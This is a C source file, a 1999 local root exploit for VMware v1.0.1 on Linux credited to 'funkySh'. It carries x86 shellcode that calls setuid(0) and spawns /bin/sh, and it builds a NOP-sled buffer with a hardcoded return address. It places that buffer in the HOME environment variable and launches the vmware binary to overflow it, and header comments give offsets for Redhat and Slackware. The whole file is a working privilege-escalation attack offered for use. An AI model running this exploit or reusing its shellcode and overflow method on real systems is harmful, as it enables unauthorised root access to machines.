/* 
 * VMware v1.0.1 root sploit
 * funkySh 02/07/99
 * 
 * 1. Redhat 5.2     2.2.9 offset 800-1100
 * 2.                      offset 1600-2200
 * 1. Slackware 3.6  2.2.9 offset 0
 * 2.                      offset ?       
 *
 * [ 1 - started from xterm on localhost ]
 * [ 2 - started from telnet, with valid display ]
 */


#include <stdio.h> 

char code[] = "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" /*setuid(0) */
              "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
              "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
              "\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

#define BUFFER 1032
#define NOP 0x90 
#define RET_ADDR 0xbfffdf50
#define PATH "/usr/local/bin/vmware"

char buf[BUFFER];

void main(int argc, char * argv[])
{
  int i, offset = 0;
  if(argc > 1) offset = atoi(argv[1]);

 memset(buf,NOP,BUFFER);
 memcpy(buf+800,code,strlen(code));
 for(i=854+2;i<BUFFER-2;i+=4)
   *(int *)&buf[i]=RET_ADDR+offset;

  setenv("HOME", buf, 1);
  execl(PATH,"vmware","-display","127.0.0.1:0",0);
  /* change IP if required */
}
